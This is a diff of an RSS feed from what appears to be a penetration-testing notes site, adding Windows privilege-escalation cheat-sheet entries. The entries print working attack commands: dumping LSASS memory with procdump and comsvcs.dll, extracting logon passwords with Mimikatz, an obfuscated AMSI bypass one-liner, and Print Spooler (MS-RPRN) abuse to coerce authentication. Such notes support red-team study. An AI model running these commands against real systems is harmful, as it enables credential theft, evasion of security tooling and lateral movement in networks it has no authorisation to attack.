@@ -39,13 +39,12 @@ Local Exploit Suggester # You can feed syteminfo output to windows-exploit-sugge
     </item>
     
     <item>
-      <title>LSASS and Mimikatz</title>
+      <title>LSASS, Mimikatz, SAM</title>
       <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
-      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp # Several dumping methods here https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/ 
-Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
+      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp # Several dumping methods here - https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/ - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md # You can use the cmsvcs.dll DLL in order the dump LSASS (https://beta.hackndo.com/remote-lsass-dump-passwords/) # C:\Windows\System32 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &amp;lt;lsass pid&amp;gt; lsass.dmp full# Dumping LSASS using the Windows Error Reporting process https://www.</description>
     </item>
     
     <item>
@@ -112,6 +111,16 @@ Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound dat
       <guid>/windows-systems/privilege-escalation/amsi_and_evasion/</guid>
       <description>Resources # AMSI Bypass Methods https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/ https://www.contextis.com/us/blog/amsi-bypass https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/ # DLL Hijacking https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/ # AMSI Bypass generator https://amsi.fail/ 
 AMSI Bypass Methods # Methods pulled from the previous mentionned resources # More details on the resources # 1. Powershell Downgrade # Older version of powershell doesn&amp;#39;t use AMIS powershell -version 2# 2. Base64 Encoding # Original AMSI Bypass PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.AmsiUtils&amp;#39;).GetField(&amp;#39;amsiInitFailed&amp;#39;,&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true) # Base64 encoded PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.&amp;#39;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;QQBtAHMAaQBVAHQAaQBsAHMA&amp;#39;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&amp;#39;))),&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true)# 3. Hooking # The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed .</description>
+    </item>
+    
+    <item>
+      <title>Spooler Service</title>
+      <link>/windows-systems/privilege-escalation/spoolerservice/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/spoolerservice/</guid>
+      <description>WIP Finding Spooler Services # https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse # Finding Windows Servers on the domain Get-ADComputer -Filter {(OperatingSystem -like &amp;#34;*windows*server*&amp;#34;) -and (OperatingSystem -notlike &amp;#34;2016&amp;#34;) -and (Enabled -eq &amp;#34;True&amp;#34;)} -Properties * | select Name | ft -HideTableHeaders &amp;gt; servers.txt # Finding Spooler services listening # https://github.com/NotMedic/NetNTLMtoSilverTicket .\Get-SpoolStatus.ps1 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server} # Or on Linux rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN 
+MS-RPRN Abuse (Printer Bug) https://www.thehacker.recipes/active-directory-domain-services/movement/mitm-and-coerced-authentications/ms-rprn # Ask the service to authenticate against an arbitrary host # Using SpoolSample (https://github.</description>
     </item>
     
   </channel>
